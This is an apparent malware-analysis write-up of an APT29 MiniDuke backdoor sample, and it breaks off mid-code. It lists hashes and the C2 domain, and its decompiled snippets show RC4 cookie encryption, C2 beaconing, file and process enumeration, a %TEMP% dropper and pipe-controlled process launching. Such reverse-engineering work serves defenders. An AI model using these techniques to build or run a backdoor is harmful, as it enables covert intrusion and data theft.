---
title: "CozyBear/APT29 MiniDuke Malware Analysis Report"
date: 2026-02-02 12:00:00 +0300
categories: [malware analysis, APT]
tags: [miniduke, apt29, cozybear, reverse-engineering, malware-analysis, windows, rc4, api-hashing, named-pipes]
---

In my journey of learning and enhancing my skills in malware analysis and reverse engineering , I took ***Richard Feynman's*** approach of studying and practicing things above my current skill level . I believe this leads to a better learning curve , as Professor ***Feynman*** believed . Today I'm sharing a detailed analysis of a rather old sample (from about 2020) , but a great learning opportunity — looking inside techniques employed by one of the most advanced malware threat actors . Without further ado , let's dive in.

## Executive Summary

This is a  backdoor malware , mainly for doing **Discovery** and exeucuting recieved commands . It has an array  of functionality. The most important are enumerating the file system , collecting file/dir names in a certain path together with their last modification time. It also harvests username and hostname info, all file systems on the system with their types (removable/fixed/network share, etc.) , and discovers the victim's IPv4 address by running socket communication in a separate thread, sending different info based on the state of the socket (listening, accept, closed) , and determining the network interface state (up/down).

Notably, the most important aspect is that it can send various types of data via an HTTP GET request result , including dropping a file to `%TEMP%` and trying to run it as a different user, communicating with it via **named pipes** , and finally sending all harvested info via a POST request .

## Sample Identification

**Hashes**

| Type    | Value                                                              |
| ------- | ------------------------------------------------------------------ |
| MD5     | `c8e6cab481e023001ef10dd278ff83c2`                                 |
| SHA-1   | `718c2ce6170d6ca505297b41de072d8d3b873456`                         |
| SHA-256 | `6057b19975818ff4487ee62d5341834c53ab80a507949a52422ab37c7c46b7a1` |

**File Type:** PE32 (32-bit executable), 272.45 KB (278,992 bytes)

**Creation Time:** 2019-06-24 13:18:27 UTC
**First Seen in the Wild:** 2020-02-12 15:44:38 UTC

**Common names of this malware:** explorer, miniduke, utopia.exe

## Malware Capabilities

- **File system enumeration:** Enumerates certain paths in the file system, collecting filenames/dirnames together with their last modification time. It also collects all available file drive letters together with their type — enabling it to enumerate all file systems on the victim machine.
- **C2 communication:** Sends GET requests to `salesappliances.com:80` . It uses an encrypted cookie value that differs on every request, and requests a differently-named file every time (`<randomly generated string>.php`).
- **Dropper:** Can drop files to the `%TEMP%` directory under the name `trw0x5.TMP`, then creates a process to launch them. The dropped files are launched with anonymous pipe handles , meaning they can send data back which the malware reads and forwards to the attacker.
- Taken together, this malware acts as a controller, spyware, and dropper — it harvests data, drops other malware, controls it, and receives its results.

## Basic Static Analysis

This malware is digitally signed with a Mozilla certificate, to make it look like a legitimate program , but the ceritificate did not verify , hinting that this certificate might be stolen from another **app** .

![Digital signature in PEStudio](/resources/Miniduke-rsrcs/1_Lfbk2RC3nWQzxbW7obsoqg.png)
*Digital signature as seen in the PEStudio tool.*

String analysis revealed a goldmine of clues:

```
salesappliances.com:80                                        (C2 server domain)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36   (user agent)
DefPipe                                                        (named pipe used by the malware)
http://salesappliances.com/                                    (C2 server URL)
GET
POST                                                            (HTTP methods)
http://10.1.1.1:8080                                            (local proxy IP, discussed later)

term %d
pid %5ds
uptime %5d.%02dh
proc:  %d %s
login: %s\%s
ID:    0x%08X                                                  (format strings for exfiltrated data)
host:  %s:%d
meth:  %s %d
pipe: \\%s\pipe\%s
lang:  %s
delay: %d
```

Now, moving to the core of the analysis.

## Advanced Static Analysis

### Malware runs in a separate thread

```c
hHandle = CreateThread(0, 0, MainMalware, 0, 0, 0);
WaitForSingleObject(hHandle, 0xFFFFFFFF);
```

### Main malware function

Throughout the analysis, in almost every function, there's a big chunk of switch-and-loop junk code that does nothing but waste the analyst's time:

![Junk code screenshot 1](/resources/Miniduke-rsrcs/junk_instruction1.png)
![Junk code screenshot 2](/resources/Miniduke-rsrcs/junk_instruction2.png)
*six nested loops is not by any means real code*
From here on, we'll ignore this code, as it's just junk code , used to waste analyst time .

### API hashing

The malware resolves its imports at runtime via API hashing, using the following scheme:

```c
int result[] = {module base, hash1, hash2, hash3, ...};
// hashes will be filled instead with the corresponding resolved function.

kernel32Base = LoadLibraryA("kernel32.dll");
if ( !kernel32Base )
    return 0;
if ( !fillArrayOfPointerToDllAndfunctions(&kernel32Base) )
    return 0;
// Resolves imports from kernel32.dll

PadvApiStuff = LoadLibraryA("advapi32.dll");
if ( !PadvApiStuff )
    return 0;
if ( !fillArrayOfPointerToDllAndfunctions(&PadvApiStuff) )
    return 0;
// Resolves imports from advapi32.dll

PWininetStuf = LoadLibraryA("wininet.dll");
if ( !PWininetStuf )
    return 0;
if ( !fillArrayOfPointerToDllAndfunctions(&PWininetStuf) )
    return 0;
// Resolves HTTP functions (send request / add request headers, etc.) from wininet.dll
```

Next, it acquires a handle to the CSP, indicating use of crypto functions:

```c
CryptAcquireContextA(&CSPhandle, 0, 0, 1u, CRYPT_SILENT | -268435456);
```

### The MainStorage struct

One important note: the authors of this malware store all info (pipes, domains, function pointers, keys, etc.) in one large struct. I tried identifying as many fields as possible — I called it `MainStorage`.

```c
prepareaminStroge(&MainStorage);
{
    SetSecurityBasedAcl(MainStorage); // any object created based on this will have read/write/delete + global access
    MainStorage->DoAndHandleRequestResult = &off_441600; // pointer to security descriptor
    SetDacl(&MainStorage->securityDescriptor.Dacl); // after security desc
    fillFuncPointers(&MainStorage->lpfunc1); // fill with function pointers
    prepareEncryptionKey(MainStorage->ZeroToSeven, "01234567", 8); // needs more analysis
    sub_420EFC(MainStorage); // fill with data
    MainStorage->ticks = 0;
    MainStorage->LpRecievedData = 0;
    MainStorage->Zero3 = 0;
    MainStorage->PerformanceCounter = PerformanceCounter;
    MainStorage_1 = MainStorage->PerformanceCounter;
    if ( !MainStorage_1 ) // true
    {
        PerformanceCounter = registryAccess(MainStorage);
        MainStorage_1 = &MainStorage->DoAndHandleRequestResult;
        MainStorage->PerformanceCounter = PerformanceCounter;
    }
    return MainStorage_1;
}
```

This function fills the struct with data needed later. We'll focus on three aspects.

1.`SetSecurityBasedAcl(MainStorage)`

```c
MainStorage->lpFunc1 = &off_441A78;
pIdentifierAuthority.Value[0] = 0;
pIdentifierAuthority.Value[1] = 0;
pIdentifierAuthority.Value[2] = 0;
pIdentifierAuthority.Value[3] = 0; // create a World SID (any user can access)
pIdentifierAuthority.Value[4] = 0;
pIdentifierAuthority.Value[5] = 1;
NewAcl = 0;
if ( AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 0, 0, 0, 0, 0, 0, 0, 0, &pSid) )
```

Here we create a SID (Security Identifier, used to uniquely identify security principals) — specifically the WORLD SID: `S-1-1-0`.

Next, an ACE is created to add to an access control list (ACL), with delete/read/write permissions:

```c
memset(&pListOfExplicitEntries, 0, sizeof(pListOfExplicitEntries));
pListOfExplicitEntries.grfAccessPermissions = 0xC0100000; // GENERIC_READ | GENERIC_WRITE | DELETE
pListOfExplicitEntries.grfAccessMode = SET_ACCESS; // security protections (ACE)
pListOfExplicitEntries.grfInheritance = NO_INHERITANCE;
pListOfExplicitEntries.Trustee.TrusteeForm = TRUSTEE_IS_SID;
pListOfExplicitEntries.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
pListOfExplicitEntries.Trustee.ptstrName = pSid;
SetEntriesInAclA(1u, &pListOfExplicitEntries, 0, &NewAcl); // create new ACL allowing access by the SID (well-known group)
```

Finally, to apply this ACL to an object, it's placed in a `SECURITY_DESCRIPTOR` structure, which is passed when creating things like threads, mutexes, pipes, etc.:

```c
*&MainStorage->securityDescriptor.Revision = LocalAlloc(LMEM_ZEROINIT, 0x14u); // allocate on heap
InitializeSecurityDescriptor(*&MainStorage->securityDescriptor.Revision, 1u); // initialize security descriptor
if ( NewAcl )
    SetSecurityDescriptorDacl(*&MainStorage->securityDescriptor.Revision, 1, NewAcl, 0); // apply DACL to this security descriptor
else
    SetSecurityDescriptorDacl(*&MainStorage->securityDescriptor.Revision, 1, 0, 0);
MainStorage->securityDescriptor.Group = *&MainStorage->securityDescriptor.Revision;
MainStorage->securityDescriptor.Owner = 12;
MainStorage->securityDescriptor.Sacl = 0;
```

What does this mean? This technique is commonly used by multi-stage malware, where different stages can run as different users — so the malware creates their security descriptor in the WORLD group, making them accessible to any user on the system.

2.`prepareHeaders(&MainStorage, &off_44178C)`

This function fills the struct with info and headers used by HTTP communication later on:

```c
lstrcpyA(this + 4, "--------------JiM9t8g7j8KoJkLJlKqka8dbo7q5z4v5u3o4z");
CryptGenRandom(CSPhandle, 0x10u, randomData); // generate 16 random bytes
v7 = DecodeRandom(&this[*(*this - 12) + 1036], randomData, 15, DecodedBinaryString);
DecodedBinaryString[v7] = 0;
charo1 = this[v7 + 14];
fillSecondBaseOnirst(DecodedBinaryString, this + 14); // fills this+14 based on rules from decoded data
this[v7 + 14] = charo1;
lstrcpyA(this + 260, "xfiles");                 // fill HTTP headers
lstrcpyA(this + 516, "file.bin");
lstrcpyA(this + 772, "application/octet-stream");
lstrcpyA(this + 1028, "binary");
return memcpy(this + 1284, &unk_4413D4, 0x10u);
```

3.`PrepareEncryptionKey()`

This function prepares the initial state of the RC4 algorithm (used later):

```c
for ( i = 0; i <= 255; ++i )        // fill with 0-255
    ZeroToSeven[i + 0x801] = i;
ZeroToSeven[2305] = 0;              // final byte is zero
ZeroToSeven[2571] = 0;
wrap_the_key_around = 0;
J = 0;
for ( j = 0; j <= 255; ++j )
{                                    // KSA part 2
    J += ZeroToSeven[j + 0x801] + ZeroToSeven[wrap_the_key_around];
    swap(&ZeroToSeven[j + 2049], &ZeroToSeven[J + 2049]); // permute initial state
    wrap_the_key_around = (wrap_the_key_around + 1) % *(ZeroToSeven + 2307); // wrap the key around
}
for ( k = 0; k <= 255; ++k )        // PRGA: generate a keystream (first part only)
    ZeroToSeven[k + 0x90B] = ZeroToSeven[k + 0x801];
ZeroToSeven[2306] = ZeroToSeven[2305];
ZeroToSeven_1 = ZeroToSeven;
ZeroToSeven[2572] = ZeroToSeven[2571];
return ZeroToSeven_1;
```

The final parts of PRGA are split off and completed when the actual encryption happens.

4.The registry access function

```c
*Data = 0;
if ( RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\ApplicationManager", &phkResult) )
    return 0;
Type = 4;
cbData[0] = 4;                       // set according to the performance counter
if ( RegQueryValueExA(phkResult, "AppID", 0, &Type, Data, cbData) || Type != 4 )
{
    Type = 4;                        // if REG_DWORD, change the value
    *Data = sub_416384();
    RegSetValueExA(phkResult, "AppID", 0, Type, Data, 4u);
}
RegCloseKey(phkResult);
return *Data;
```

This function tries to create `Software\Microsoft\ApplicationManager\AppID`, in which it stores `GetTickCount()`. Why? This value is used as a factor in the KDF that derives the RC4 initial key (used to encrypt the cookie value).

After running the malware, we see:

![AppID registry value](/resources/Miniduke-rsrcs/1_N5MlVaSDvgc_Yyv6XS7CpA.png)
*AppID value set.*

Note that this value is set once — subsequent times, it's simply queried.

## Core Behavior

`coreBehavior(&MainStorage)` is the core functionality of the malware. Scrolling past the junk code, we see:

```c
FillTickStructure(MainStorage, MainStorage->ticks, 0, 0, 30);
RC4Algo(MainStorage);
```

RC4 encrypts the data stored in the tick structure:

```c
sub_43159C(ZeroToSeven);            // prepare initial key: "01234567"
KDF(ZeroToSeven, tick1, 4);
for ( i6 = 4; i6 < i5; ++i6 )
{
    v3 = tick1 + i6;
    *v3 = RC4Completion(ZeroToSeven, *(&tick1->tick1 + i6)); // send the modified key with the byte from the tick/performance count array
}
return i6;
```

### KDF

The KDF derives the key from the previously stored `TickCount()`, using the following algorithm:

```c
// replace bytes 0, 1, 3, 7 with the key factor
ZeroToSeven[*(ZeroToSeven + 0x903)] = *ZeroToSeven;
*ZeroToSeven = *keyFactor;           // mix bytes 0-7 with the tick count bytes
ZeroToSeven[*(ZeroToSeven + 0x903) + 1] = ZeroToSeven[1];
ZeroToSeven[1] = keyFactor[1];
ZeroToSeven[*(ZeroToSeven + 0x903) + 2] = ZeroToSeven[3];
ZeroToSeven[3] = keyFactor[2];
ZeroToSeven[*(ZeroToSeven + 0x903) + 3] = ZeroToSeven[7];
ZeroToSeven[7] = keyFactor[3];
```

Finally, the loop calls `RC4Completion` on every byte, completing the PRGA and XOR-ing the data:

```c
ZeroToSeven[2571] += ZeroToSeven[++ZeroToSeven[0x901] + 0x801];
swap(&ZeroToSeven[ZeroToSeven[0x901] + 0x801], &ZeroToSeven[ZeroToSeven[0xA0B] + 2049]); // swap bytes
ZeroToSeven[1024] = ZeroToSeven[ZeroToSeven[0x901] + 0x801] + ZeroToSeven[ZeroToSeven[0xA0B] + 0x801];
return a2 ^ ZeroToSeven[ZeroToSeven[0x400] + 0x801]; // final XOR
```

### Main loop

```c
if ( !ConnectToDomain(MainStorage) ) // connects to salesappliances.com, sets options and proxy for the connection
{
    Sleep(0xBB8u);                   // retry later on failure
    continue;
}
```

It tries to connect to the C2 server (`http://salesappliances.com`, port 80) and retries on failure.

`ConnectToDomain` also sets a local proxy to `http://10.1.1.1:8080`, which we saw in the string analysis:

```c
wininet_InternetSetOptionA(*(lp0x4B_2 + *(*lp0x4B_2 - 12) + 1360), 38, v21, 12) != 0
// "http://10.1.1.1:8080" — proxy type INTERNET_OPTION_OFFLINE_MODE (local proxy)
```

After connecting successfully, the malware performs a GET request to retrieve data for the next steps:

```c
resultOfRequest = (*MainStorage->DoAndHandleRequestResult)(
    MainStorage,
    MainStorage->ticks,
    MainStorage->tickStructsie,
    &MainStorage->LpRecievedData);
```

Snippet of the HTTP request sent:

```
GET http://salesappliances.com/kxikco.php HTTP/1.1
Accept: text/html, application/xml;q=0.9, image/png, image/gif, image/jpeg, image/x-bitmap, */*;q=0.1
Referer: http://salesappliances.com/otka=anxiej
Accept-Language: en-US,en
Accept-Encoding: gzip, deflate
Cookie: 9=erq9XdSNtyoSemjTZbYjUAq8_QDTz2t93xQ7jvlW4
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
Host: salesappliances.com
Proxy-Connection: Keep-Alive
Pragma: no-cache
```

The requested resource (`.php`) changes every time — it's generated from a random binary string — and the cookie value is based on an encrypted tick count plus a random binary string, so it also changes every time.

Received data is RC4-encrypted, in the following form:

```
first 4 bytes:  factor for the KDF
next 4 bytes:   check value (RC4-encrypted, verifies the algorithm worked)
remaining bytes: RC4-decrypted payload
```

Next, the malware checks byte 28 of the received data. (Note: this malware has very diverse functionality, so a control byte determines what it does in a given round — not all functionality appears at once.)

```c
Core(&MainStorage->lpfunc1, MainStorage->LpRecievedData, MainStorage->ticks);
```

This is the core dispatch function. All gathered data (plus its length) is stored in the tick struct.

If the control byte is `0xFE`, everything is reset:

```c
if ( *(recievedFileData + 28) == 0xFE ) // reset all handles
{
    resetStuff1(&lpfunc1[*(*lpfunc1 - 12)]);
    resetStuff2(&lpfunc1[*(*lpfunc1 - 40)]);
    resetStuff3(&lpfunc1[*(*lpfunc1 - 24)]);
    resetStuff4(&lpfunc1[*(*lpfunc1 - 52)]);    // close socket
    resetStuff5(&lpfunc1[*(*lpfunc1 - 32)]);    // unmap the view
    resetStuff6(&lpfunc1[*(*lpfunc1 - 36)]);    // unmap...
    ticksStruct->errorFlag = 0;
    return 0;
}
```

The main dispatched functions, which we'll cover briefly:

```c
harvestFileDriInfo(&lpfunc1[*(*lpfunc1 - 12)], recievedFileData, ticksStruct);
ManipulateFilesystem(&lpfunc1[*(*lpfunc1 - 20)], recievedFileData, ticksStruct);
enumerateModulesOfTargetProcess(&lpfunc1[*(*lpfunc1 - 40)], recievedFileData, ticksStruct); // enumerate all modules of a target process
if ( !*&lpfunc1[*(*lpfunc1 - 12) + 12] && !*&lpfunc1[*(*lpfunc1 - 40) + 12] )
    *&lpfunc1[*(*lpfunc1 - 16) + 4] = 0;

OpenREcievedProcess(&lpfunc1[*(*lpfunc1 - 44)], recievedFileData, ticksStruct);
harvestGeneralInfo(&lpfunc1[*(*lpfunc1 - 48)], recievedFileData, ticksStruct);
CreateProcesesWithPipeCommunication(&lpfunc1[*(*lpfunc1 - 24)], recievedFileData, ticksStruct);
malwareDropper(&lpfunc1[*(*lpfunc1 - 28)], recievedFileData, ticksStruct); // drop the attacker-sent file
j_md5sum(&lpfunc1[*(*lpfunc1 - 32)], recievedFileData, ticksStruct);       // create a file mapping backed by the file in temp
j_md5sumSimilar(&lpfunc1[*(*lpfunc1 - 36)], recievedFileData, ticksStruct);
sub_40A0A4(&lpfunc1[*(*lpfunc1 - 52)], recievedFileData, ticksStruct);
```

1.`harvestFileDirInfo`

Based on the control byte, it either finds the first file in a directory name sent by the attacker, or enumerates all dirs/files in a previously opened directory. All file/dir names with their last modification time are stored in the tick struct.

2.`ManipulateFilesystem`

Allows the attacker to move/delete/copy files or directories by name (already known from the previous functions). The most noticeable part:

```c
GetDriveTypes(frequentplace, &ticksStruct->ErrorMessageOrDAta);

DriveTypeA = GetDriveTypeA(lpRootPathName); // determine fixed/removable/flash/etc.
lstrcatA(lpString1, lpRootPathName);
lstrcatA(lpString1, " ");
switch ( DriveTypeA )
{
    case 0u:
        lstrcatA(lpString1, "unk\n");   // drive type cannot be determined
        break;
    case 1u:
        lstrcatA(lpString1, "nrt\n");   // invalid root path (no volume mounted)
        break;
    case 2u:
        lstrcatA(lpString1, "rmv\n");   // removable disk
        break;
    case 3u:
        lstrcatA(lpString1, "fix\n");   // hard disk
        break;
    case 4u:
        lstrcatA(lpString1, "net\n");   // network share
        break;
    case 5u:
        lstrcatA(lpString1, "cdr\n");   // CD-ROM
        break;
    case 6u:
        lstrcatA(lpString1, "ram\n");   // RAM disk
        break;
    default:
        lstrcatA(lpString1, "und\n");
        break;
}
```

Now the attacker knows about every file system on the device, and can enumerate it with the earlier function.

3.`enumerateModulesOfTargetProcess`

Based on the control byte: if `0x30`, enumerate the first module in the requested PID — or, if no PID is sent, gather a list of all PIDs and put them in the tick struct (so the attacker can target any process). If `0xC4`, enumerate all modules of a previously-opened process, storing their path and base address in the tick struct.

**Implication:** this lets the threat actor craft follow-on payloads that use techniques like DLL stomping, process hollowing, and similar.

4.`harvestGeneralInfo`

Harvests general info such as username/hostname, current input locale, and system uptime:

```c
v44 = GetTickCount() / 0x3E8;
v43 = v44 / 0xE10;
v42 = v44 % 0xE10;
wnsprintfA(&ticksStruct->ErrorMessageOrDAta, 0x4000, "uptime %5d.%02dh\n", v44 / 0xE10, v44 % 0xE10);
ticksStruct->errorFlag = 0x81;
ticksStruct->legnthOfGatheredInfo += lstrlenA(&ticksStruct->ErrorMessageOrDAta);
```

All gated by the control byte. **Implication:** this info facilitates later functionality.

5.`CreateProcesesWithPipeCommunication`

A very important function:

```c
lstrcpyA(&frequentplace->SecurityAttribs + 12, resolvedString[0]);
memset(&frequentplace->SecurityAttribs, 0, sizeof(frequentplace->SecurityAttribs));
frequentplace->SecurityAttribs.nLength = 12;
frequentplace->SecurityAttribs.bInheritHandle = 1; // make the handle inheritable
frequentplace->SecurityAttribs.lpSecurityDescriptor = 0;
if ( !CreatePipe(&frequentplace->pipe, &frequentplace->HwritePipe, &frequentplace->SecurityAttribs, 0x4000u)
    || !CreatePipe(&frequentplace->Hread2, &frequentplace->hWritePipe2, &frequentplace->SecurityAttribs, 0x4000u) )
{
    goto failedToCreatePipes;
}
if ( v53 ) // run as a different user
{
    memset(&frequentplace->lpStartupInfoSession, 0, sizeof(frequentplace->lpStartupInfoSession));
    frequentplace->lpStartupInfoSession.cb = 68;
    frequentplace->lpStartupInfoSession.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    frequentplace->lpStartupInfoSession.hStdOutput = frequentplace->HwritePipe;
    frequentplace->lpStartupInfoSession.hStdError = frequentplace->HwritePipe;
    frequentplace->lpStartupInfoSession.hStdInput = frequentplace->Hread2;
    frequentplace->lpStartupInfoSession.wShowWindow = 0; // no window shown
    MultiByteToWideChar(0, 0, resolvedString[0], -1, username, 512);
    MultiByteToWideChar(0, 0, resolvedString[1], -1, Domain, 512);
    MultiByteToWideChar(0, 0, resolvedString[2], -1, WideCharStr, 512);
    MultiByteToWideChar(0, 0, lpMultiByteStr_1, -1, CommandLine, 2048);
    lstrcpyA(&frequentplace->SecurityAttribs + 12, lpMultiByteStr_1);
    GetCurrentDirectoryW(0x800u, CWD);
    lpPassword = WideCharStr;
    if ( WideCharStr[0] == 42 )
        WideCharStr[0] = 0;
    frequentplace->Fsuccess = CreateProcessWithLogonW(
        username, Domain, lpPassword, 0, 0,
        CommandLine,               // run a process as a different user
        CREATE_SUSPENDED, 0, CWD,
        &frequentplace->lpStartupInfoSession,
        &frequentplace->procInfo);
    memset(WideCharStr, 0, sizeof(WideCharStr));
}
else // run as the current user
{
    memset(&frequentplace->startupinfoNormal, 0, sizeof(frequentplace->startupinfoNormal));
    frequentplace->startupinfoNormal.cb = 68;
    frequentplace->startupinfoNormal.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    frequentplace->startupinfoNormal.hStdOutput = frequentplace->HwritePipe;
    frequentplace->startupinfoNormal.hStdError = frequentplace->HwritePipe;
    frequentplace->startupinfoNormal.hStdInput = frequentplace->Hread2;
    frequentplace->startupinfoNormal.wShowWindow = 0;
    frequentplace->Fsuccess = CreateProcessA(
        0, &frequentplace->SecurityAttribs + 12, 0, 0, 1,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 0, 0,
        &frequentplace->startupinfoNormal,
        &frequentplace->procInfo);
}
if ( frequentplace->Fsuccess )
{
    ticksStruct->errorFlag = 0xA1;
    frequentplace->hThread1 = frequentplace->procInfo.hProcess;
    frequentplace->hThread2 = frequentplace->procInfo.hThread;
    if ( EnumProcessModules(frequentplace->hThread1, p_modules, 4, &n0x2000) )
    {
        if ( GetModuleFileNameExA(frequentplace->hThread1, p_modules[0], moduleName, 1024) )
            wnsprintfA(&ticksStruct->ErrorMessageOrDAta, 0x4000, "%5d %s\n", // send first module + PID
                frequentplace->procInfo.dwProcessId, moduleName);
    }
    else
    {
        wnsprintfA(&ticksStruct->ErrorMessageOrDAta, 0x4000, "%5d %s\n",
            frequentplace->procInfo.dwProcessId, &frequentplace->SecurityAttribs + 12);
    }
    ticksStruct->legnthOfGatheredInfo += lstrlenA(&ticksStruct->ErrorMessageOrDAta);
}
```

Based on the control byte, it either creates the process as a different user, or normally as the current user.

Why use a pipe here at all? These anonymous pipes serve as a **backup** IPC mechanism — the main communication, as we'll see, happens through a named pipe.

Note that these processes are created **suspended**, which lets the author enumerate their modules first (via the previous function), or even use them as targets for process hollowing.

In the same function:

```c
if ( controlByte == 0xE1 ) // when the pipe was already created
{
    if ( frequentplace_1->Fsuccess )
    {
        ticksStruct->errorFlag = 0xA2;
        ResumeThread(frequentplace_1->hThread2);
        frequentplace->State = 1;
        WaitForSingleObject(frequentplace->hThread1, 0x5DCu);
        CloseHandle(frequentplace->hThread2);
        *&frequentplace->startupInfo = PeekNamedPipe(
            frequentplace->pipe, &ticksStruct->ErrorMessageOrDAta, 0x4000u, &BytesRead, 0, 0);
        if ( *&frequentplace->startupInfo )
        {
            if ( BytesRead ) // after the thread finishes, check for data in the pipe and read it
            {
                *&frequentplace->startupInfo = ReadFile(
                    frequentplace->pipe, &ticksStruct->ErrorMessageOrDAta, 0x4000u, &BytesRead, 0);
                ticksStruct->legnthOfGatheredInfo += BytesRead;
            }
```

This resumes the process (perhaps once the author no longer needs it suspended), then checks for data in the pipe, reading and storing it in the tick struct if present.

Finally, when done with the created process, it's terminated:

```c
else if ( controlByte == 0xE3 )
{
    frequentplace_1->State = 0;         // close without reading from the pipe
    if ( frequentplace_1->hThread1 != -1 )
        TerminateProcess(frequentplace_1->hThread1, 0);
    frequentplace->hThread1 = -1;
}
```

**TL;DR:** this function lets the malware run a process as a different user (or the current user), then communicate with it via pipes to receive results (anonymous pipes serve as the backup channel).

5.`j_md5sum`

Worth covering, as it likely runs right after the dropper (dropper control byte `0x12`, this is `0x11`):

```c
GetTempPathA(0x400u, &lpString1->tempPath);
kernel32_GetLongPathNameA(&lpString1->tempPath, &lpString1->tempPath, 1024);
GetTempFileNameA(&lpString1->tempPath, "trw", 5u, &lpString1->tempPath); // create %TEMP%\trw0x5.TMP
lpString2 = (recievedFileData + 30);
if ( recievedFileData[31] == 0x3A || *lpString2 == 0x5C && lpString2[1] == 0x5C ) // format of the sent data
{                                                // starts with :\ or \\
    lstrcpyA(lpString1, lpString2);
}
else
{
    GetCurrentDirectoryA(0x400u, lpString1);
    lstrcatA(lpString1, "\\");
    lpString2[*(recievedFileData + 6) - 30] = 0;
    lstrcatA(lpString1, lpString2);
}
lpString1->hFile = -1;
lpString1->hFile = CreateFileA(lpString2, 0x80000000, FILE_READ_DATA, 0, OPEN_EXISTING, FILE_READ_ATTRIBUTES, 0);
if ( lpString1->hFile == -1
    || (lpString1->mappingBase = CreatememoryMappings(&lpString1->fileMappingStruct, lpString1->hFile)) == 0 ) // map the previously dropped executable
{
    dwMessageId = GetLastError();       // failed — reset and exit
    FormatMessageA(0x1000u, 0, dwMessageId, 0, &ticksStruct->ErrorMessageOrDAta, 0x4000u, 0);
    ticksStruct->legnthOfGatheredInfo += lstrlenA(&ticksStruct->ErrorMessageOrDAta);
    if ( lpString1->hFile != -1 )
        sub_41597C(&lpString1->fileMappingStruct);
    return 0;
}
```

This function retrieves the path in `%TEMP%` where the file will be dropped (`%TEMP%\trw0x5.TMP`). We'll ignore the code below this point, since this call fails at this stage — the file isn't dropped yet.

After `malwareDropper` is called and the file is dropped, the malware computes its MD5 hash (since it was encrypted, then decrypted) to verify it matches:

```c
CreatememoryMappings(&lpString1->fileMappingStruct, lpString1->hFile)
{
    placo_mappings->fileSize = GetFileSize(placo_mappings->hFile, 0);
    if ( !placo_mappings->fileSize )
        return 0;
    placo_mappings->mappingObj = CreateFileMappingA(placo_mappings->hFile, 0, PAGE_WRITECOPY, 0, 0, 0);
    // enables read-only / copy-on-write access to a mapped view of a file mapping object (shared)
    if ( !placo_mappings->mappingObj )
        return 0;
    placo_mappings->baseaddress = MapViewOfFile(placo_mappings->mappingObj, FILE_MAP_COPY, 0, 0, placo_mappings->fileSize);
    if ( placo_mappings->baseaddress )
        return placo_mappings->baseaddress;
}
```

This creates a memory mapping of the file, letting the malware read it page-by-page without calling `ReadFile` (see resources below).

```c
fillmd5InitialConstants(&md5Struct_);
GetMd5Checksum(&md5Struct_, lpString1->mappingBase, lpString1->fileMappingStruct.fileSize);

// md5Struct_ contains the hash + remaining unhashed data
hashRemainingBytes(lpString1->filemd5Sum, &md5Struct_);

// now md5Struct_ is zeroed; checksum stored in filemd5sum
memcpy(&ticksStruct->ErrorMessageOrDAta, lpString1->filemd5Sum, 0x10u);
ticksStruct[1].mem4 = lpString1->fileMappingStruct.fileSize; // to send to the attacker
lstrcpyA(&ticksStruct[1].mem5, lpString1);
v7 = lstrlenA(lpString1);
```

The MD5 hash is then filled into the tick struct.

**Implication:** if the hash doesn't match, the malware author will try re-sending the file.

### `sub_40A0A4`

```c
sub_415E70(                              // extract IP info from the socket later
    (frequentplace + 12),
    recievedCommand,                     // not "off"
    portNumber,
    domainNamePointer,                   // "salesappliances.com:80"
    PortNumPointer);
Sleep(0x3E8u);
retrieveSocketThreadState((frequentplace + 12), &ticksStruct->ErrorMessageOrDAta);
ticksStruct->legnthOfGatheredInfo += lstrlenA(&ticksStruct->ErrorMessageOrDAta);
ticksStruct->errorFlag = 0x81;
```

This function's behavior is based on a control byte and a command (`"off"` or otherwise).

```c
// sub_415E70
*status = 0;
status->tcpSocket1 = socket(AF_INET, SOCK_STREAM, 0);
status->SocketInfo.sin_family = 2;
status->SocketInfo.sin_port = htons(*&status->port8080);
status->SocketInfo.sin_addr.S_un.S_addr = inet_addr(&status->recievedCommand); // possibly another C2 server
status->ControlSocket = socket(AF_INET, SOCK_STREAM, 0);
status->SocketInfo2.sin_family = 2;
status->SocketInfo2.sin_port = htons(status->port80);
status->SocketInfo2.sin_addr.S_un.S_addr = inet_addr(&status->domainName); // uses DNS
if ( bind(status->tcpSocket1, &status->SocketInfo, 16) >= 0 && listen(status->tcpSocket1, 5) >= 0 )
{
    do                                    // receive from the sent domain name on port 8080
    {
        *status = 1;
        if ( *status == 4 )
            break;

        status->ControlSocket = socket(AF_INET, SOCK_STREAM, 0);
        if ( !connect(status->ControlSocket, &status->SocketInfo2, 16) ) // connection succeeded; server is alive
        {
            *status = 2;
            status->tcpSocketActual = accept(status->tcpSocket1, 0, 0); // if the control-server connection worked, accept a connection from the sent domain
            if ( status->tcpSocketActual )
            {
                if ( *status == 4 )
                    break;
                *status = 3;
                selectRecvSend(status->tcpSocketActual, status->ControlSocket); // effectively closes both sockets' read and write
                closesocket(status->tcpSocketActual);
            }
        }
        closesocket(status->ControlSocket);
    }
    while ( *status != 4 );
    *status = 0;
}
```

This function runs in a separate thread. Based on the socket state (listen failed/succeeded, accept failed/succeeded, etc.), it sets a status flag — read by `retrieveSocketThreadState()`:

```c
ErrorMessagesOrData = 0;
n4 = *networkInfoStruct;
if ( *networkInfoStruct == 2 ) // control-socket connect succeeded
{
LABEL_12:
    lstrcatA(ErrorMessagesOrData, "connect "); // you -> C2
    sub_406948(networkInfoStruct->ControlSocket, IpPortBothSides, 128);
    lstrcatA(ErrorMessagesOrData, IpPortBothSides);
LABEL_13:
    lstrcatA(ErrorMessagesOrData, "listen ");  // C2 -> you
    sub_406948(networkInfoStruct->tcpSocket1, IpPortBothSides, 128);
    return lstrcatA(ErrorMessagesOrData, IpPortBothSides);
}
if ( n4 > 2 )
{
    if ( n4 != 3 )
    {
        if ( n4 == 4 )
            return lstrcatA(ErrorMessagesOrData, "stop\n"); // thread has stopped
        return n4;
    }
    lstrcatA(ErrorMessagesOrData, "accept ");  // control-socket connect succeeded and accept succeeded
